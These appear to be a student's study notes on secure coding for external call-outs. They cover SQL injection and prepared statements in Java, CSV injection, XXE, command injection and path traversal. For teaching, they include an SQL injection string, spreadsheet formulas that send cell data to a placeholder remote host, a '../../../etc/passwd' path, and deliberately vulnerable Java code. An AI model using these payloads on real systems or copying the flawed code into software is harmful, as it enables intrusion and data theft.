## Dependency
No program is truly self-contained.  
Dependency can be not so obvious such like dynamic libraries, kernel modules, run-time libraries, and so on.  
What components you trust?  
**What** data do you send to the component? Have you read the documentation about what is allowed or supported?  
**How** do you send the data to component? with encrypted channel?  
What kind of output do you accept from component?  
Your implementation of library would cause to danger! e.g. use `JSON.parse()` instead of `eval()`.  
If you can't be sure secure or not, just re-implement.  
Make sure any call-out only pass valid and expected values for every parameter.  
However, it is difficult because library always calls in potentially surprising ways.  

## Metachracters
Metacharacters are the chars which are not interpreted as data in input.  
Different language would have different meanings for metacharacters, such as `'` in SQL and `$` in POSIX shell.  
Make sure your program to make them escaped when someone tries to input metacharacters.  
e.g. first, how sql connection looks like in java  
```java
String url = "jdbc:mysql://localhost:3306/mydb";
Class.forName("com.mysql.jdbc.Driver").newInstance();
Connection connection = DriverManager.gerConnection(url, "root", "root");
Statement statement = connection.createStatement();
ResultSet result = null;
```
This is the poor code because **password is hard-coded**, and **easy to guess**.  
e.g. SQL injection  
```java
String query = "select * from authors where name = '" + search_name + "'";
result = statement.executeQuery(query);
while(result.next()){ System.out.println(result.getString(1));  // get the result on column1 from result set }
...
statement.close();
connection.close();
```
string concatenation with untrusted input would cause to SQL injection!  
Here, single quote (`'`) is the **metacharacter**!  

## SQL injection
**Blacklist is also impossible** because there are massive variation in SQL interpreters.  
Solution? **Prepare Statement**  
e.g. The example of Prepare Statement  
```java
String query = "select * from authors where name = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, search_name);    // set the first parameter as search_name (our input)
ResultSet result = stmt.execute();
```
👍 **Why prepared statement can prevent from sql injection?**  
Take the sample above for example, if we don't use prepare statement with my input: `1pwnch' or 1=1#`  
```sql
select * from authors where name = '1pwnch' or 1=1#'
```
SQL would compile and execute the query above and make it return the whole table of authors.  
However, if I use prepare statement, `select * from authors where name = ?` would be compiled first.  
After I `setString`, my `search_name` would be passed as a parameter value, and won't be compiled again!!  
Therefore, SQL would try to find the author's name which is `1pwnch' or 1=1#`.  
Of course, there is not such name in usual case, and cause to the failure of sql injection.  
> Compile includes semantic analysis which could determine the meaning of query. Therefore, if you want to make your sql injection success, you must make your input compiled!!  

**However, prepare statement can also be misused**  
```java
String query = "select * from authors where name = '" + search_name + "'";
PreparedStatement stmt = connection.prepareStatement(query);
ResultSet result = stmt.execute();
```  
This is a really **bad use of prepare statement**.  
> Remember! Prepared statement only works if untrusted inputs are all prepared!!


## CSV injection
When excel open csv file, file would be converted to format of excel. Excel provides some convenient dynamic functions, and makes the `formula` in csv run!  
e.g. payload  
```csv
=CONCATENATE(A2:E2)
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
The all formulas above begining with `=` would be executed.

## XXE
Metachars in XML: `<>`, `[]`, `%`, `&`.  
Solution: check the external reference with whitelist?  
Solution: Don't use XML?  

## Command injection
Metachars in command shell: `&`, `;`, `\`, `<>`, `\r`, `\n`, `{}`, `[]`, `()`, `^`, `~`, `|`...  
```java
Runtime.getRuntime.exec(cmd);
```
cmd from the untrusted user input.

## Disaster about pathname
If attacker can control pathname...  
`../../../etc/passwd` to leak the secret of system.  
Solution: Use whitelist to block the char likes `.`, `/`, and even `\`.  
Window pathname:  
* Built-in reserved device name  
* drives can even create more reserved names  
* Directory separator includes `/` and `\`  

Unix-like pathname:  
* Directory separator `/`, terminated with `\0`  
* Case sensitive  
* Some problematic filename include Space, Control char(tab, newline, escape), non-UTF8, `-`(option mark)...  

## Reference
[Course material: Secure-Software-5-Call-Out](https://dwheeler.com/secure-class/presentations/Secure-Software-5-Call-Out.ppt)
